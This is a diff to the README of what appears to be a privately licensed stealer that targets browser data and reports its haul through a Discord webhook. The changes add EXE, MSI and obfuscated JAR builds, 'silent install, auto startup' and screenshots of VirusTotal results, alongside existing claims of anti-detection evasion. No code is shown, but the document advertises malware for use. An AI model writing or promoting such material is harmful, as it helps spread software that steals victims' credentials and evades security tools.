@@ -22,6 +22,7 @@
   <img src="https://img.shields.io/badge/Build-Stable-success" alt="Build">
   <img src="https://img.shields.io/badge/Discord-Verified-5865F2?logo=discord&logoColor=white" alt="Discord">
   <img src="https://img.shields.io/badge/Node.js-18+-339933?logo=node.js&logoColor=white" alt="Node.js">
+  <img src="https://img.shields.io/badge/Java-JDK%2021-ED8B00?logo=openjdk&logoColor=white" alt="Java">
   <img src="https://img.shields.io/badge/License-Private-red" alt="License">
 </p>
 
@@ -46,6 +47,16 @@
 
 ---
 
+## Build Formats
+
+| Format | Type | Description |
+|--------|------|-------------|
+| **.EXE** | Windows Native | Standalone executable, no dependencies, fastest startup |
+| **.MSI** | Windows Installer | Silent install, auto startup, professional look |
+| **.JAR** | Java / Cross-Platform | Runs on any system with Java, heavy obfuscation, JRE portable |
+
+---
+
 ## Supported Browsers
 
 ### Chromium-based
@@ -65,9 +76,14 @@
 
 ## Screenshots
 
-### VirusTotal Scan Result
+### VirusTotal Scan Result (EXE)
 <p align="center">
-  <img src="Screenshot_1.png" alt="VirusTotal Result" width="700">
+  <img src="Screenshot_1.png" alt="VirusTotal EXE Result" width="700">
+</p>
+
+### VirusTotal Scan Result (JAR)
+<p align="center">
+  <img src="Screenshot_3.png" alt="VirusTotal JAR Result" width="700">
 </p>
 
 ### Discord Webhook Output
@@ -79,6 +95,8 @@
 
 ## Technical Details
 
+- **Multiple Build Formats** - EXE, MSI, and JAR support
+- **Java Build** - Cross-platform JAR with heavy obfuscation (Skidfuscator)
 - **Single Executable** - No dependencies, runs immediately
 - **Anti-Detection** - Advanced evasion techniques
 
